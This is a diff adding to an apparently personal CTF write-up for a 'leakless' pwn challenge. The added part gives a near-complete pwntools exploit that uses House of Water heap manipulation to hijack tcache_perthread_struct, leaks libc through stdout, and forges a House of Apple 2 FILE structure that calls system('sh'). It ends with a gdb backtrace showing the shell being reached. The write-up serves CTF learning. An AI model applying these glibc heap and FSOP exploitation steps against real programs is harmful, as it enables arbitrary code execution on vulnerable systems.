@@ -4,7 +4,7 @@ ctf: "leakless"
 category: "pwn"
 difficulty: "easy"
 points: null
-date: "2026-05-21"
+date: "2026-05-22"
 lat: -9.71
 lng: 1200
 summary: "Overlapping large heap bins directly with the tcache_perthread_struct by bypassing the victim->bk->fd safety checks, successfully forcing a fake 0x10000-sized chunk allocation to control target tcache bucket counts and heads."
@@ -428,7 +428,7 @@ def main():
 
     Finally, we successfully got a fake chunk directly into the tcache_perthread_struct! Ohhhhhhhhh!
     I'm officially done with this stage of the approach. We have successfully performed House of Water! 
-    So, in the next post, I will share exactly how I will get shell access. ;D
+    So, in the next section, I will share exactly how I will get shell access. ;D
     That is the easy part; I was just struggling with the initial layout setup of this tactic.
     -----------------------------------------------------------------
     pid 8958
@@ -486,3 +486,228 @@ def main():
     idx=26 -> malloc(0xfff0)
     edit idx=26 offset=0x0 data=b'AAAAAAA'
     -----------------------------------------------------------------
+
+```python
+
+def leak_():
+    r.sendlineafter(b"> ",b"4")
+    r.recvuntil(b"exit(): ")
+    lib = r.recv(1)
+    r.recvuntil(b"heap: ")
+    heap = r.recv(1)
+    return heap,lib
+
+def main():
+    global r
+    r = conn()
+``` 
+
+    
+    Now, in this section, we will try to get a shell after getting an arbitrary write on stdout. We need to perform 
+    an attack that grants us this exact primitive, and its name is House of Water. I learned it, so I should be able to 
+    execute this attack even from a leakless perspective.
+
+    Let's do it. First, the size I will use is 0x100 for chunk_1, chunk_2, and chunk_3.
+    
+```python
+
+    entry_11 = []
+    for i in range(7):
+        entry_11.append(malloc(0x100))
+
+    chunks2 = malloc(0x100)
+```
+    
+    Now we have 8 chunks on the tcache for entry 0x11, and chunk number 8 will act like chunk_2 on 
+    the unsorted bin later on.
+
+    The next step is to create chunk_1, chunk_3, and their respective padding chunks (chunk_1_p and chunk_3_p).
+    
+```python
+
+    big_p = malloc(0x600+ 0x100+0x100 + 0x30 + 0x20)
+    guard = malloc(0x10)
+    free(big_p)
+    big = malloc(0x600 + 0x100+0x100 + 0x30 + 0x20)
+    free(big_p)
+    malloc(0x10)  # 0x600 + 0x100+0x100 + 0x20
+    
+    top_p = malloc(0x5b0)
+    chunks1_p = malloc(0x100)
+    guard = malloc(0x20)
+    chunks3_p = malloc(0x100)
+    guard = malloc(0x20)
+
+    edit(big,p64(0x841),0x18) # 0x5b0 + 0x100+0x100 + 0x20 + 0x20 + 0x10*5 
+    free(top_p)
+    
+    top = malloc(0x5b0+0x10)
+    chunks1 = malloc(0x100)
+    guard = malloc(0x20)
+    chunks3 = malloc(0x100)
+    guard = malloc(0x10) # shifted by 0x10 so this the size left
+ ```   
+    
+    Now, let's create the fake |prev_size|size| header fields for our fake_chunk.
+
+```python
+
+    #                            BIG                   ENTRY_11  HEADER   PERTHREAD SIZE
+    malloc(0x10080-(0x600+ 0x100+0x100 + 0x30 + 0x20)-(0x100*8)-(0x10*11)-0x290  -  0x20)
+    size = malloc(0x10)
+    edit(size,p64(0x10000)+p64(0x20))
+```
+   
+    Create the fake_chunk's fd/bk pointers inside the tcache_perthread_struct.
+
+```python
+ 
+    edit(big,p64(0x31),0x5d0+0x8)  # acts like a bk for our fake_chunks
+    free(chunks1_p)
+    edit(big,p64(0x111),0x5d0+0x18)
+    
+    edit(big,p64(0x21),0x710+0x8) # acts like fd for our fake_chunks
+    free(chunks3_p)
+    edit(big,p64(0x111),0x710+0x18)
+```
+ 
+    The next step is to forge the fake_chunk's size field by forcing the tcache entry count to increment.
+
+```python
+
+    entry_61 = malloc(0x3e8)
+    entry_62 = malloc(0x3d8)
+    free(entry_61)
+    free(entry_62)
+```   
+    The final step is coming up here, buddy, which is to free chunk_1 and chunk_3 to go into the unsorted bin.
+    Basically, we are creating the exact list we want to link our fake_chunk to once it's created.
+
+```python
+
+    for i in entry_11:
+        free(i)
+
+    free(chunks3)
+    free(chunks2)
+    free(chunks1)
+```   
+    Executing the steps to link our fake_chunk into the unsorted list, since all safety checks will pass.
+
+```python
+
+    bits,lib = leak_()
+    bits = int(bits,16)
+    bits = p16((bits<<12) +0x80)
+
+    edit(big,bits,0x5d0+0x20) # chunks1 change fd
+    edit(big,bits,0x710+0x28) # chunks3 change bk
+```   
+
+    We can execute malloc(0x10000 - 0x10) to gain direct access to the tcache_perthread_struct for the next stage.
+
+```python
+ 
+    perthread = malloc(0x10000-0x100) # why -0x100 to get it forward to top pointing to main_arena
+```
+    
+    Now it's all good! We got direct access to the entries starting from index 0, so we can change the head pointer and 
+    do some stuff that will help us get a shell. This works because when malloc looks at a tcache entry and finds 
+    the correct size bucket, it simply pops the address from that entry—whatever it happens to point to. Therefore, to get 
+    our arbitrary write, we just need to target stdout. Let's do it—easy FSOP, I love it! 
+    Admittedly, I was struggling with the heap layout itself earlier since this tactic is completely new to me, 
+    but I learned an immense amount from it.
+    
+        
+```python
+ 
+    bits_exit = int(lib,16)
+    offset_out = (libc.sym['_IO_2_1_stdout_'] - libc.sym['exit']) 
+    offset_exit = (bits_exit << 12) + (libc.sym['exit']&0xfff)
+    offset_out = (offset_exit + offset_out) & 0xffff
+    
+```
+    
+    Now we can overwrite the last 2 bytes of the main_arena pointer stored in tcache entry[1]. This will give us 
+    an arbitrary write over stdout, but the problem is that the allocation size is limited to just 0x30 bytes. To bypass this, 
+    we will use this small write to force stdout to leak a libc address first. Then, we can write the target address of stdout 
+    into a larger sized tcache bucket, like entry[61] or whatever is available, allowing us to get a full overwrite of the structure 
+    and completely redirect execution flow!
+    
+```python
+    
+    edit(perthread,p16(offset_out),8)
+    stdout = malloc(0x28)
+
+    fp = p64(0xfbad1800)
+    fp+= p64(0)
+    fp+= p64(0)
+    fp+= p64(0)
+    fp+= b"\x00"
+
+    edit(stdout,fp)
+    
+    r.recv(33)
+    lib = u64(r.recv(8)) - libc.sym['_IO_2_1_stdout_'] - 132
+    libc.address = lib
+    log.success(f"LEAK:\nlibc:{hex(lib)}\n")
+    
+    edit(perthread,p64(libc.sym['_IO_2_1_stdout_']),0x1e0)
+    stdout = malloc(0x3e0-0x8)
+```    
+    
+    Now we have a full 0x3e0 bytes to completely overwrite stdout! This is pretty cool—we can 
+    easily deploy a House of Apple 2 chain now that we have our verified libc leak. You can read 
+    a deeper dive on how I construct the House of Apple 2 layout in my [previous post](https://0xizo.github.io/writeups/house_of_apple2).
+    
+```python
+
+    fp_addr = libc.sym['_IO_2_1_stdout_']
+
+    fp = b"aaaa;sh\x00"             # _flags
+    fp+= p64(fp_addr+0x10)          # _IO_read_ptr
+    fp+= p64(fp_addr+0x10)          # _IO_read_end
+    fp+= p64(0)                     # _IO_read_base
+    fp+= p64(0)                     # _IO_write_base
+    fp+= p64(1)                     # _IO_write_ptr
+    fp+= p64(0)                     # _IO_write_end
+    fp+= p64(0)                     # _IO_buf_base
+    fp+= p64(0)                     # _IO_buf_end
+    fp+= p64(0)*3                   # 3 dummys pointers
+    fp+= p64(0)                     # _markers
+    fp+= p64(0)                     # _chain
+    fp+= p32(0)                     # _fileno
+    fp+= p32(0)                     # _flags2
+    fp+= p64(0)                     # _old_offset
+    fp+= p64(0)                     # _cur_column &_vtable_offset...
+    fp+= p64(libc.sym['_IO_stdfile_2_lock']) # _lock
+    fp+= p64(0)                     # _offset
+    fp+= p64(0)                     # _codecvt
+    fp+= p64(fp_addr+0x100)         # _wide_data
+    fp+= p64(0)                     
+    fp+= p64(0)
+    fp+= p64(0)
+    fp+= p64(0)                    # _mode
+    fp+= p64(0)*2                  # _unused2
+    fp+= p64(libc.sym['_IO_wfile_jumps']) # vtable
+    fp+= fp.ljust(0x100,b"\x00")          #
+    fp+= p64(fp_addr+0x180)               # play with pointers 
+    fp+= p64(libc.sym['system'])          # 
+
+    edit(stdout,fp)
+    r.interactive()
+
+if  __name__ == "__main__":
+    main()
+```
+
+    ------------------------------------------------------------------------------------------
+    [ #2] 0x70d44a25ad9b <do_system+0x2eb>
+    [ #3] 0x70d44a2901b7 <_IO_wdoallocbuf+0x37> (frame name: __GI__IO_wdoallocbuf)
+    [ #4] 0x70d44a29227d <_IO_wfile_overflow+0xdd> (frame name: __GI__IO_wfile_overflow)
+    [ #5] 0x70d44a28ff7c <_IO_wdefault_xsputn+0x5c> (frame name: __GI___woverflow)
+    [ #6] 0x70d44a28ff7c <_IO_wdefault_xsputn+0x5c> (frame name: __GI__IO_wdefault_xsputn)
+    [ #7] 0x70d44a28ff7c <_IO_wdefault_xsputn+0x5c> (frame name: __GI__IO_wdefault_xsputn)
+    [ #8] 0x70d44a292ef6 <_IO_wfile_xsputn+0x66> (frame name: __GI__IO_wfile_xsputn)
+    [ #9] 0x70d44a292ef6 <_IO_wfile_xsputn+0x66> (frame name: __GI__IO_wfile_xsputn)
+    ------------------------------------------------------------------------------------------
